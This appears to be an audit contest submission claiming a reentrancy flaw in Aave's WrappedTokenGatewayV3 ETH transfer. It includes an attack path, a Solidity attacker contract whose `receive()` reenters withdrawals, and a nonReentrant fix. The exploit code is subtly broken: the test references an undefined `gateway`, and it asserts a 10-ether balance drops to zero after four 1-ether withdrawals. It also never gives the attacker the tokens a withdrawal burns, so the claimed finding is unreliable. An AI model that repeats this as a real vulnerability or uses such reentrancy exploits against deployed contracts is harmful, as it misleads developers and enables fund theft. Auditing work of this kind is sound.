# Attackers can steal funds through reentrancy in ETH transfers

### Summary

Lack of `reentrancy protection in _safeTransferETH` will cause fund theft as malicious contracts can reenter during ETH transfers and perform multiple withdrawals.



### Root Cause

In src/contracts/helpers/WrappedTokenGatewayV3.sol#152-155 (https://github.com/sherlock-audit/2025-01-aave-v3-3/blob/main/aave-v3-origin/src/contracts/helpers/WrappedTokenGatewayV3.sol#L152-L155)  the `_safeTransferETH` function lacks reentrancy protection:


### Internal Pre-conditions

1. Contract must have ETH balance
2. Attacker must deploy contract with malicious `receive()`


### External Pre-conditions

_No response_

### Attack Path

1. Attacker deploys malicious contract
2. Initiates withdrawal to malicious contract
3. Malicious contract reenters during ETH transfer
4. Multiple withdrawals occur before state updates

### Impact

1. Protocol can lose entire ETH balance
2. Multiple withdrawals possible in single transaction

### PoC

```solidity
contract ReentrancyAttacker {
    WrappedTokenGatewayV3 public gateway;
    uint256 public attackCount;
    
    constructor(address _gateway) {
        gateway = WrappedTokenGatewayV3(_gateway);
    }
    
    function attack(uint256 amount) external {
        gateway.withdrawETH(address(0), amount, address(this));
    }
    
    receive() external payable {
        if(attackCount < 3) {
            attackCount++;
            // Reenter during ETH transfer
            gateway.withdrawETH(address(0), msg.value, address(this));
        }
    }
}

contract ReentrancyPoC {
    function testReentrancyAttack() public {
        // Setup
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(gateway));
        vm.deal(address(gateway), 10 ether);
        
        // Execute attack
        attacker.attack(1 ether);
        
        // Verify multiple withdrawals
        assertGt(address(attacker).balance, 3 ether);
        assertEq(address(gateway).balance, 0);
    }
}
```

### Mitigation

```solidity
contract WrappedTokenGatewayV3 is ReentrancyGuard {
    function withdrawETH(
        address token,
        uint256 amount,
        address to
    ) external nonReentrant {
        // Existing logic
    }
    
    function _safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, 'ETH_TRANSFER_FAILED');
    }
}
```
